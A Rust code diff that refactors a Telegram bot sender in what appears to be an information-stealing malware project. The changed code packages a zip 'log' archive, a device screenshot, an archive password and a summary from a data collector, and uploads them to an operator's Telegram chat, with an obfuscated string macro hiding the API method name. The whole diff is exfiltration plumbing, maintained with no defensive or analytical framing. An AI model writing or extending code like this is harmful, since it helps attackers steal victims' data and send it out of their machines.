@@ -1,4 +1,4 @@
-use crate::{LogContent, LogSender, SendError};
+use crate::{LogContent, LogFile, LogSender, SendError};
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -16,14 +16,14 @@ pub struct TelegramBot {
     token: Arc<str>
 }
 
-fn generate_caption<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> (String, Option<String>)
+fn generate_caption<P, C>(log_content: &LogContent, password: Option<P>, collector: &C) -> (String, Option<String>)
 where
     P: AsRef<str>,
     C: Collector
 {
     let caption = DisplayCollector(collector).to_string();
 
-    let link = match log {
+    let link = match log_content {
         LogContent::ExternalLink((link, size)) => Some(
             format!(
                 r#"<a href="{}">Download [{}]</a>"#,
@@ -31,7 +31,7 @@ where
                 format_size(*size as _)
             )
         ),
-        LogContent::ZipArchive(_) => None
+        _ => None
     };
 
     let password = password.map(|password| {
@@ -111,7 +111,7 @@ impl Display for MediaGroup {
 }
 
 impl TelegramBot {
-    fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
+    fn send_as_file(&self, log_name: &str, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
         let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");
 
         write_text_field!(builder, "chat_id" => &self.chat_id);
@@ -131,7 +131,7 @@ impl TelegramBot {
         let media_json = media_group.to_string();
 
         write_text_field!(builder, "media" => &media_json);
-        write_file_field!(builder, "logfile", "log.zip", "application/zip", &archive);
+        write_file_field!(builder, "logfile", log_name => "application/zip", &archive);
 
         self.send_request(s!("sendMediaGroup"), builder)?;
 
@@ -187,15 +187,17 @@ fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> St
 }
 
 impl LogSender for TelegramBot {
-    fn send<P, C>(&self, log_file: LogContent, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
         C: Collector
     {
-        let (caption, thumbnail) = generate_caption(&log_file, password, collector);
+        let (caption, thumbnail) = generate_caption(&log_file.content, password, collector);
+        let LogFile { name, content } = log_file;
 
-        match log_file {
+        match content {
             LogContent::ZipArchive(archive) => self.send_as_file(
+                &name,
                 archive,
                 collector.get_device().get_screenshot(),
                 caption,
